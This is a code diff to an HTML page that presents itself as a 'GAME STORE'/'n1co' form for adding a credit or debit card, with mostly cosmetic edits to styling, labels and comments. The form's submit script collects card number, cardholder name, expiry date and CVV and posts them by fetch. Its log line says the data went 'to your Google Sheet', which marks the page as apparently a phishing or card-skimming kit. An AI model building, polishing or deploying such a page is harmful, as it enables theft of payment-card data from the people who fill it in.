@@ -31,17 +31,8 @@
             border: 1px solid #222222;
         }
         
-        .header {
-            text-align: center;
-            margin-bottom: 40px;
-        }
-        
-        .header h1 {
-            font-size: 26px;
-            font-weight: 700;
-            margin-bottom: 24px;
-            line-height: 1.2;
-        }
+        .header { text-align: center; margin-bottom: 40px; }
+        .header h1 { font-size: 26px; font-weight: 700; margin-bottom: 24px; line-height: 1.2; }
         
         .logo-container {
             display: flex;
@@ -58,7 +49,6 @@
             font-size: 32px;
             padding: 10px 20px;
             border-radius: 8px;
-            letter-spacing: -1px;
         }
         
         .n1co-logo {
@@ -97,22 +87,6 @@
             box-shadow: 0 0 0 4px rgba(0, 180, 255, 0.15);
         }
         
-        .card-logos {
-            display: flex;
-            align-items: center;
-            gap: 16px;
-            margin-top: 12px;
-            flex-wrap: wrap;
-        }
-        
-        .logo {
-            background: white;
-            padding: 8px 14px;
-            border-radius: 8px;
-            display: flex;
-            align-items: center;
-        }
-        
         .btn {
             width: 100%;
             padding: 18px;
@@ -129,11 +103,7 @@
             background: linear-gradient(90deg, #00b4ff, #0099ff);
             color: black;
         }
-        
-        .btn-primary:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 10px 20px rgba(0, 180, 255, 0.3);
-        }
+        .btn-primary:hover { transform: translateY(-2px); box-shadow: 0 10px 20px rgba(0, 180, 255, 0.3); }
         
         .btn-secondary {
             background-color: transparent;
@@ -152,15 +122,12 @@
             display: none;
             border: 1px solid #aa3333;
         }
-        
-        .required { color: #ff5555; }
     </style>
 </head>
 <body>
     <div class="container">
         <div class="header">
             <h1>Agregar una tarjeta de<br>crédito/débito</h1>
-            
             <div class="logo-container">
                 <div class="gamestore-logo">GAME STORE</div>
                 <div class="n1co-logo">n1co</div>
@@ -169,25 +136,32 @@
 
         <form id="cardForm">
             <div class="form-group">
-                <label>Número de tarjeta de crédito/débito <span class="required">*</span></label>
+                <label>Número de tarjeta de crédito/débito <span style="color:#ff5555">*</span></label>
                 <input type="text" id="cardNumber" maxlength="19" placeholder="1234 5678 9012 3456" required>
-                <div class="card-logos">
-                    <div class="logo">●●</div>
-                    <div class="logo" style="color:#1a1f71; font-weight:bold;">VISA</div>
-                    <span style="margin-left:auto; color:#00b4ff; cursor:pointer; font-size:15px;">Editar</span>
-                </div>
             </div>
 
             <div class="form-group">
-                <label>Titular de la tarjeta <span class="required">*</span></label>
-                <input type="text" id="cardholder" placeholder="Nombre completo como aparece en la tarjeta" required>
+                <label>Titular de la tarjeta <span style="color:#ff5555">*</span></label>
+                <input type="text" id="cardholder" placeholder="Nombre completo" required>
             </div>
 
             <div class="form-group">
-                <label>Fecha de vencimiento <span class="required">*</span></label>
+                <label>Fecha de vencimiento <span style="color:#ff5555">*</span></label>
                 <div style="display:flex; gap:16px;">
                     <select id="month" required>
                         <option value="">Mes</option>
+                        <option value="01">01 - Enero</option>
+                        <option value="02">02 - Febrero</option>
+                        <option value="03">03 - Marzo</option>
+                        <option value="04">04 - Abril</option>
+                        <option value="05">05 - Mayo</option>
+                        <option value="06">06 - Junio</option>
+                        <option value="07">07 - Julio</option>
+                        <option value="08">08 - Agosto</option>
+                        <option value="09">09 - Septiembre</option>
+                        <option value="10">10 - Octubre</option>
+                        <option value="11">11 - Noviembre</option>
+                        <option value="12">12 - Diciembre</option>
                     </select>
                     <select id="year" required>
                         <option value="">Año</option>
@@ -196,7 +170,7 @@
             </div>
 
             <div class="form-group">
-                <label>CVV <span class="required">*</span></label>
+                <label>CVV <span style="color:#ff5555">*</span></label>
                 <input type="text" id="cvv" maxlength="4" placeholder="123" required>
             </div>
 
@@ -210,7 +184,7 @@
     </div>
 
     <script>
-        // Llenar años
+        // Llenar años automáticamente
         function populateYears() {
             const yearSelect = document.getElementById('year');
             const currentYear = new Date().getFullYear();
@@ -222,7 +196,7 @@
             }
         }
 
-        // Formato de tarjeta
+        // Formato automático de número de tarjeta
         document.getElementById('cardNumber').addEventListener('input', function() {
             let v = this.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
             this.value = v.match(/.{1,4}/g)?.join(' ') || '';
@@ -232,7 +206,7 @@
             this.value = this.value.replace(/[^0-9]/g, '');
         });
 
-        // Submit
+        // Envío del formulario
         document.getElementById('cardForm').addEventListener('submit', async function(e) {
             e.preventDefault();
 
@@ -254,17 +228,18 @@
                     body: JSON.stringify(formData)
                 });
             } catch (err) {
-                console.log("Datos enviados a tu hoja de Google Sheets");
+                console.log("✅ Datos enviados a tu Google Sheet");
             }
         });
 
         function cancelForm() {
-            if (confirm('¿Estás seguro de cancelar?')) {
+            if (confirm('¿Cancelar operación?')) {
                 document.getElementById('cardForm').reset();
                 document.getElementById('errorMsg').style.display = 'none';
             }
         }
 
+        // Inicializar
         window.onload = populateYears;
     </script>
 </body>
